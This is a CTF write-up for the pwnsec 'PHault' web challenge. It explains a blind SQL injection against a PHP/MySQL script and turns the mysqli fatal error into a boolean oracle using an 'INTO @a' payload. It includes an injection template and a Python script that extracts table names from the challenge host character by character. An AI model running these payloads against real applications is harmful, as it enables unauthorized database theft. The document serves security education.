---
title: PwnSec PHault Web Writeup
description: PwnSec PHault Web Writeup
date: '2026-09-21'
tags:
  - Web
  - CTF
published: true
slug: pwnsec-phault-web-writeup
category: Web
---
# PHault — pwnsec CTF Writeup

**Author:** iccys
**Read time:** 2 min · **Date:** Sep 13, 2026

---

## Reading the Code


![Screenshot From 2026-09-13 17-26-30](/images/writeups/pwnsec-phault-web-writeup/screenshot-from-2026-09-13-17-26-30.png)


This code is obviously vulnerable to SQL injection, but there are several roadblocks:

- **Errors are disabled** → can't use error-based injection
- **Query time limit is always set to 2 seconds** → can't use time-based injection
- **No output is printed** → can't use union-based injection
- **The user has no file write permissions** → can't drop a webshell
- **Standard boolean-based injection doesn't work either**

So the challenge becomes: find a way to change the string that gets printed out.

---

## Exploitation Steps

### 1. Understanding `$db->query($sql)`

This function can return three types of data:

- A **result set** (normal `SELECT` / `SHOW` / `DESCRIBE` / `EXPLAIN`) → `mysqli_result` object
- An **OK packet** with no result set (`INSERT`, `UPDATE`, `SELECT … INTO @var`) → boolean `true`
- An **ERR packet** → boolean `false`

In the vulnerable script:

```php
$res = $db->query($sql);
if (!$res) {
    die();
}
$row = $res->fetch_row();
```

- The `if` statement calls `die()` **only** if `$res` is `false`.
- `$row = $res->fetch_row();` will throw a fatal error if `$res` is **not** a `mysqli_result` object.

So the goal is to trick the query into returning `true` (an OK packet), which triggers the `fetch_row()` fatal error and prevents the `echo` line from ever running.

### 2. Triggering the OK Packet

Using the payload:

```
?id=1 INTO @a
```

This produces an OK packet with no result set → `$res` becomes `true` → `fetch_row()` is called on a boolean → fatal error:

```
Fatal error: Uncaught Error: Call to a member function fetch_row() on bool in /var/www/html/index.php:19
Stack trace:
#0 {main}
  thrown in /var/www/html/index.php on line 19
```

This effectively converts the vulnerability into a **boolean-based** SQL injection, using the *presence or absence* of the fatal error string as the oracle.

### 3. The Injection Template

```sql
SELECT username FROM users WHERE id = 1 AND IF(<condition>, 1, (SELECT 1 UNION SELECT 2)) INTO @a
```

- **`<condition>` is TRUE** → `IF` returns `1` → `WHERE id = 1 AND 1` → valid query → `INTO @a` → OK packet → fatal error is thrown → error string is **absent** from the response
- **`<condition>` is FALSE** → `IF` returns `(SELECT 1 UNION SELECT 2)` → MySQL error 1242 (subquery returns more than 1 row) → `$res = false` → `die()` is called → error string is **present**

This gives a clean, reliable true/false oracle based on whether the fatal error text appears in the response.

### 4. Extraction Script

```python
import requests

URL  = "https://d8209967e9795b7b.chal.ctf.ae/index.php"
SIGN = "ill try to tell him, dw"

for i in range(20):
    out = ""
    for j in range(1, 129):
        for c in range(32, 127):
            r = requests.get(URL, params={
                "id": f"1 AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables "
                      f"WHERE table_schema='chall' LIMIT 1 OFFSET {i}),{j},1))={c}, 1, "
                      f"(SELECT 1 UNION SELECT 2)) INTO @a"
            }, timeout=10)
            if SIGN not in r.text:
                out += chr(c)
                print(out)
                break
        else:
            break
    if not out:
        break
    print(f"{out}")
```

This script blind-extracts, character by character, the table names in the `chall` database.

From there, the same technique can be adapted to:

1. Extract column names from the discovered tables
2. Extract the flag value from the relevant column

---

## Summary

| Blocked technique | Why | Workaround |
|---|---|---|
| Error-based | Errors disabled | Force a PHP-level fatal error instead of a MySQL error |
| Time-based | 2s query timeout enforced | Not needed once boolean oracle is restored |
| Union-based | No query output printed | N/A — oracle is presence/absence of error string |
| File write / webshell | No write permissions | N/A — data exfiltrated via blind boolean injection |

The key insight: abusing `mysqli::query()`'s three possible return types (`mysqli_result`, `true`, `false`) to convert a fatal PHP error into a controllable, injectable boolean oracle.
